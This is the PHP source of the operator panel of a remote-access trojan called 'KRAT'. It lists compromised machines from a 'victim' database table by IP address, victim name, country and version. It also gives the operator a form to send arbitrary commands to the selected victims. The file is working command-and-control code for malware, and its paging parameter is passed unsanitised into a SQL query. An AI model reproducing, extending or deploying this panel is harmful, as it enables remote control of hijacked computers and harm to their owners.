<?php
session_start();
include('Information.php');
if (isset($_SESSION['login'])) {
    if (!$_SESSION['login'] == '1') {
        header('location: index.php');
    }
} else {
    header('location: index.php');
}
if (isset($_GET['errvc'])) {
    echo "<script type='text/javascript'>
        alert('Please Select Minimum One User .');
    </script>";
} elseif (isset($_GET['errcl'])) {
    echo "<script type='text/javascript'>
        alert('Please Enter Any Command First .');
    </script>";
}
?>
<html>
    <head>
        <link rel="stylesheet" href="style.css" type="text/css" >
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
        <script type="text/javascript">
            function checkboxall(object){
                var myBools = false;
                var numb = document.querySelectorAll('input[type="checkbox"]').length ;
                if(object.checked) myBools = true;
                for(i=1; i<=numb; i++){
                    document.getElementById("BaLL"+(i)).checked = myBools;
                } 
                return true;		
            }
        </script>
    </head>
    <body>
        <form action="sendcl.php" method="post">
        <section class="header">
            <img src="image/header.png" />
        </section>
        <section class="menu">
            <a href="panel.php"><i class="fa fa-user"></i> Users List</a>
            <a href="commands.php"><i class="fa fa-terminal"></i> Commands</a>
            <a href="about.php"><i class="fa fa-info"></i> About</a>
            <a href="logout.php"><i class="fa fa-sign-out"></i> Logout</a>
        </section>
        <section class="Users">
             <table border="1" style="width:100%">
              <tr>
                <th><input OnChange="checkboxall(this);" type="checkbox" name="ca" />#</th>
                <th>IP Address</th>
                <th>Victim Name</th>
                <th>Country</th>
                <th>Date</th>
                <th>Version</th>
              </tr>
                 <form method="get" action="commands.php">
                <?php
                if (!isset($_GET['p'])) {
                    $PageNumber = 1;
                } else {
                    $PageNumber = $_GET['p'];
                }
                $numrow = '1';
                $conn = new mysqli($servername, $username, $password, $dbname);
                if ($conn->connect_error) {
                    die("Connection failed: " . $conn->connect_error);
                }
                $sql3 = "SELECT * FROM victim";
                $CountValue = 0;
                $result3 = $conn->query($sql3);
                if ($result3->num_rows > 0) {
                    while($row3 = $result3->fetch_assoc()) {
                        $CountValue = $CountValue + 1;
                    }
                }
                 echo "<title>Panel ($CountValue) KRAT .</title>
                 ";
                $CountValue = round($CountValue / 10) +1;
                 ?>
                    <section class="Page">
                        <h>Page : </h>
                 <?php
                        $Pages = '';
                for($i = 1; $i <= $CountValue; $i++) {
                    $Pages = $Pages . ' <a href="panel.php?p='.$i.'">'.$i.'</a>';
                }
                        echo $Pages;
                ?>
                    
                     </section> 
                     <br>      
                <?php
                $start = ($PageNumber - 1) * 10;
                $sql = "SELECT ip, cname, country, date, version FROM victim LIMIT $start,10";
                $result = $conn->query($sql);
                if ($result->num_rows > 0) {
                    
                    while($row = $result->fetch_assoc()) {
                        echo '<tr><td><input id="BaLL'.$numrow.'" OnChange="document.getElementById('."'".'maincheck'."'".').checked = false; return true;" type="checkbox" name="checkedvalue[]" value="'.$row['ip'].'" />'.$numrow.'</td><td><a href="commands.php?i='.base64_encode($row['ip'].'-spliter-'.$row['cname']).'">'.$row['ip'].'</a></td><td>'.$row['cname'].'</td><td>'.$row['country'].'</td><td>'.$row['date'].'</td><td>'.$row['version'].'</td></tr>
                        ';
                        $numrow = $numrow + 1;
                    }
                } else {
                    echo "";
                }
                
                $conn->close();
                ?>
                </form>
              </tr>
            </table> 
        <section class="sended">
            <i class="fa fa-terminal"></i>&nbsp;<h>Command : </h>&nbsp;
            <input type="text" name="CommandLine" placeholder="Enter Command Here .." />
            <input type="submit" name="submit" value="Send Command" />
        </section>
        </form>
    </body>
</html>